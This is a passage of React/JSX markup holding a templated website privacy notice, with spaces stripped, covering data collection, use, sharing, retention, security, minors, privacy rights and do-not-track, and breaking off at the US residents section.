br/></div><divstyle={{lineHeight:'1.5'}}><br/></div><divid='infocollect'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(0,0,0)'}}><spanstyle={{color:'rgb(0,0,0)',fontSize:15}}><spanstyle={{fontSize:15,color:'rgb(0,0,0)'}}><spanstyle={{fontSize:15,color:'rgb(0,0,0)'}}><spanid='control'style={{color:'rgb(0,0,0)'}}><strong><spandata-custom-class='heading_1'>1.WHATINFORMATIONDOWECOLLECT?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divid='personalinfo'style={{lineHeight:'1.5'}}><spandata-custom-class='heading_2'style={{color:'rgb(0,0,0)'}}><spanstyle={{fontSize:15}}><strong>Personalinformationyoudisclosetous</strong></span></span></div><div><div><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><strong><em>InShort:</em></strong></span></span></span></span><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><strong><em>&nbsp;</em></strong><em>Wecollectpersonalinformationthatyouprovidetous.</em></span></span></span></span></span></span></div></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'>Wecollectpersonalinformationthatyouvoluntarilyprovidetouswhenyou{''}<spanstyle={{fontSize:15}}><bdtclassName='block-component'/></span></span><spandata-custom-class='body_text'>expressaninterestinobtaininginformationaboutusorourproductsandServices,whenyouparticipateinactivitiesontheServices,orotherwisewhenyoucontactus.</span></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><bdtclassName='block-component'/></span></span></span></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><strong>PersonalInformationProvidedbyYou.</strong>ThepersonalinformationthatwecollectdependsonthecontextofyourinteractionswithusandtheServices,thechoicesyoumake,andtheproductsandfeaturesyouuse.Thepersonalinformationwecollectmayincludethefollowing:<spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='forloop-component'/></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='question'>names</bdt></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='forloop-component'/></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='question'>emailaddresses</bdt></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='forloop-component'/></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='question'>mailingaddresses</bdt></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='forloop-component'/></span><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></div><divid='sensitiveinfo'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>SensitiveInformation.</strong><bdtclassName='block-component'/>Wedonotprocesssensitiveinformation.</span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='else-block'/></span></span><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'><bdtclassName='block-component'/></bdt></span></span></span></span><bdtclassName='block-component'/></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'>Allpersonalinformationthatyouprovidetousmustbetrue,complete,andaccurate,andyoumustnotifyusofanychangestosuchpersonalinformation.</span></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></span></span></span></span></span></span></span><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divid='infouse'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanid='control'style={{color:'rgb(0,0,0)'}}><strong><spandata-custom-class='heading_1'>2.HOWDOWEPROCESSYOURINFORMATION?</span></strong></span></span></span></span></span></div><div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><strong><em>InShort:&nbsp;</em></strong><em>Weprocessyourinformationtoprovide,improve,andadministerourServices,communicatewithyou,forsecurityandfraudprevention,andtocomplywithlaw.Wemayalsoprocessyourinformationforotherpurposeswithyourconsent.</em></span></span></span></span></span></span></div></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><strong>Weprocessyourpersonalinformationforavarietyofreasons,dependingonhowyouinteractwithourServices,including:</strong><bdtclassName='block-component'/></span></span></span><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></div><ul><listyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><strong>Torespondtouserinquiries/offersupporttousers.&nbsp;</strong>Wemayprocessyourinformationtorespondtoyourinquiriesandsolveanypotentialissuesyoumighthavewiththerequestedservice.<spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><pstyle={{fontSize:15,lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt></p><pstyle={{fontSize:15,lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt></p><pstyle={{fontSize:15,lineHeight:'1.5'}}><bdtclassName='block-component'/></p><pstyle={{fontSize:15,lineHeight:'1.5'}}><bdtclassName='block-component'/></p><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></span><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='whoshare'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>3.WHENANDWITHWHOMDOWESHAREYOURPERSONALINFORMATION?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong><em>InShort:</em></strong><em>&nbsp;Wemayshareinformationinspecificsituationsdescribedinthissectionand/orwiththefollowing{''}<bdtclassName='block-component'/>thirdparties.</em></span></span></span></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'>We<bdtclassName='block-component'/>mayneedtoshareyourpersonalinformationinthefollowingsituations:</span></span></div><ul><listyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><strong>BusinessTransfers.</strong>{''}Wemayshareortransferyourinformationinconnectionwith,orduringnegotiationsof,anymerger,saleofcompanyassets,financing,oracquisitionofalloraportionofourbusinesstoanothercompany.</span></span></li></ul><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}/></bdt><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><bdtclassName='block-component'><spandata-custom-class='body_text'/></bdt></span><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt></div><ul><listyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><strong>BusinessPartners.</strong>{''}Wemayshareyourinformationwithourbusinesspartnerstoofferyoucertainproducts,services,orpromotions.</span></span><bdtclassName='statement-end-if-in-editor'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt></li></ul><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><divstyle={{lineHeight:'1.5',}}><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><bdtclassName='block-component'><spandata-custom-class='heading_1'/></bdt></span></span></span></span></span><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span><bdtclassName='block-component'><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></bdt></span></span></span></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='inforetain'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>4.HOWLONGDOWEKEEPYOURINFORMATION?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong><em>InShort:&nbsp;</em></strong><em>Wekeepyourinformationforaslongasnecessaryto{''}<bdtclassName='block-component'/>fulfill<bdtclassName='statement-end-if-in-editor'/>{''}thepurposesoutlinedinthisprivacynoticeunlessotherwiserequiredbylaw.</em></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wewillonlykeepyourpersonalinformationforaslongasitisnecessaryforthepurposessetoutinthisprivacynotice,unlessalongerretentionperiodisrequiredorpermittedbylaw(suchastax,accounting,orotherlegalrequirements).<bdtclassName='block-component'/></span>&nbsp;</span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Whenwehavenoongoinglegitimatebusinessneedtoprocessyourpersonalinformation,wewilleitherdeleteor{''}<bdtclassName='block-component'/>anonymize<bdtclassName='statement-end-if-in-editor'/>{''}suchinformation,or,ifthisisnotpossible(forexample,becauseyourpersonalinformationhasbeenstoredinbackuparchives),thenwewillsecurelystoreyourpersonalinformationandisolateitfromanyfurtherprocessinguntildeletionispossible.<spanstyle={{color:'rgb(89,89,89)',}}><bdtclassName='block-component'/></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='infosafe'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>5.HOWDOWEKEEPYOURINFORMATIONSAFE?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong><em>InShort:&nbsp;</em></strong><em>Weaimtoprotectyourpersonalinformationthroughasystemof{''}<bdtclassName='block-component'/>organizational<bdtclassName='statement-end-if-in-editor'/>{''}andtechnicalsecuritymeasures.</em></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wehaveimplementedappropriateandreasonabletechnicaland{''}<bdtclassName='block-component'/>organizational<bdtclassName='statement-end-if-in-editor'/>{''}securitymeasuresdesignedtoprotectthesecurityofanypersonalinformationweprocess.However,despiteoursafeguardsandeffortstosecureyourinformation,noelectronictransmissionovertheInternetorinformationstoragetechnologycanbeguaranteedtobe100%secure,sowecannotpromiseorguaranteethathackers,cybercriminals,orother{''}<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>{''}thirdpartieswillnotbeabletodefeatoursecurityandimproperlycollect,access,steal,ormodifyyourinformation.Althoughwewilldoourbesttoprotectyourpersonalinformation,transmissionofpersonalinformationtoandfromourServicesisatyourownrisk.YoushouldonlyaccesstheServiceswithinasecureenvironment.<spanstyle={{color:'rgb(89,89,89)',}}><bdtclassName='statement-end-if-in-editor'/></span><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='infominors'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>6.DOWECOLLECTINFORMATIONFROMMINORS?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong><em>InShort:</em></strong><em>&nbsp;Wedonotknowinglycollectdatafromormarketto{''}<bdtclassName='block-component'/>childrenunder18yearsofage<bdtclassName='else-block'/>.</em><bdtclassName='block-component'/></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>Wedonotknowinglysolicitdatafromormarkettochildrenunder18yearsofage.ByusingtheServices,yourepresentthatyouareatleast18orthatyouaretheparentorguardianofsuchaminorandconsenttosuchminordependent’suseoftheServices.Ifwelearnthatpersonalinformationfromuserslessthan18yearsofagehasbeencollected,wewilldeactivatetheaccountandtakereasonablemeasurestopromptlydeletesuchdatafromourrecords.Ifyoubecomeawareofanydatawemayhavecollectedfromchildrenunderage18,pleasecontactusat{''}<spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='question'>nathandai2000@gmail.com</bdt><bdtclassName='else-block'/></span></span>.</span><spandata-custom-class='body_text'><bdtclassName='else-block'><bdtclassName='block-component'/></bdt></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='privacyrights'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>7.WHATAREYOURPRIVACYRIGHTS?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong><em>InShort:</em></strong><em>&nbsp;<spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'><em><bdtclassName='block-component'/></em></span></span>&nbsp;</span>Youmayreview,change,orterminateyouraccountatanytime.</em><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><bdtclassName='block-component'><bdtclassName='block-component'/></bdt></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='withdrawconsent'style={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><strong><u>Withdrawingyourconsent:</u></strong>{''}Ifwearerelyingonyourconsenttoprocessyourpersonalinformation,<bdtclassName='block-component'/>{''}whichmaybeexpressand/orimpliedconsentdependingontheapplicablelaw,<bdtclassName='statement-end-if-in-editor'/>{''}youhavetherighttowithdrawyourconsentatanytime.Youcanwithdrawyourconsentatanytimebycontactingusbyusingthecontactdetailsprovidedinthesection{''}<bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/></span></span></span><adata-custom-class='link'href='#contact'><spanstyle={{fontSize:15,color:'rgb(0,58,250)',}}><spanstyle={{fontSize:15,color:'rgb(0,58,250)',}}><spandata-custom-class='body_text'>HOWCANYOUCONTACTUSABOUTTHISNOTICE?</span></span></span></a><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/>{''}below<bdtclassName='block-component'/>.</span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'>However,pleasenotethatthiswillnotaffectthelawfulnessoftheprocessingbeforeitswithdrawalnor,<bdtclassName='block-component'/>{''}whenapplicablelawallows,<bdtclassName='statement-end-if-in-editor'/>{''}willitaffecttheprocessingofyourpersonalinformationconductedinrelianceonlawfulprocessinggroundsotherthanconsent.<bdtclassName='block-component'/></span></span><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}><spanstyle={{color:'rgb(89,89,89)',}}><bdtclassName='block-component'/></span></span></span></span></span></span></span></span></span></span><bdtclassName='block-component'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15,}}>Ifyouhavequestionsorcommentsaboutyourprivacyrights,youmayemailusat{''}<bdtclassName='question'>nathandai2000@gmail.com</bdt>.</span></span><bdtclassName='statement-end-if-in-editor'><spanstyle={{fontSize:15,}}><spandata-custom-class='body_text'/></span></bdt></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='DNT'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>8.CONTROLSFORDO-NOT-TRACKFEATURES</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spandata-custom-class='body_text'>MostwebbrowsersandsomemobileoperatingsystemsandmobileapplicationsincludeaDo-Not-Track(<bdtclassName='block-component'/>&quot;DNT&quot;<bdtclassName='statement-end-if-in-editor'/>)featureorsettingyoucanactivatetosignalyourprivacypreferencenottohavedataaboutyouronlinebrowsingactivitiesmonitoredandcollected.Atthisstagenouniformtechnologystandardfor{''}<bdtclassName='block-component'/>recognizing<bdtclassName='statement-end-if-in-editor'/>{''}andimplementingDNTsignalshasbeen{''}<bdtclassName='block-component'/>finalized<bdtclassName='statement-end-if-in-editor'/>.Assuch,wedonotcurrentlyrespondtoDNTbrowsersignalsoranyothermechanismthatautomaticallycommunicatesyourchoicenottobetrackedonline.Ifastandardforonlinetrackingisadoptedthatwemustfollowinthefuture,wewillinformyouaboutthatpracticeinarevisedversionofthisprivacynotice.<bdtclassName='block-component'/></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divid='uslaws'style={{lineHeight:'1.5',}}><spanstyle={{color:'rgb(127,127,127)',}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15,}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanid='control'style={{color:'rgb(0,0,0)',}}><strong><spandata-custom-class='heading_1'>9.DOUNITEDSTATESRESIDENTSHAVESPECIFICPRIVACYRIGHTS?</span></strong></span></span></span></span></span></div><divstyle={{lineHeight:'1.5',}}><br/></div><divstyle={{lineHeight:'1.5',}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)',}}><spanstyle={{fontSize:15,color:'rgb(89,89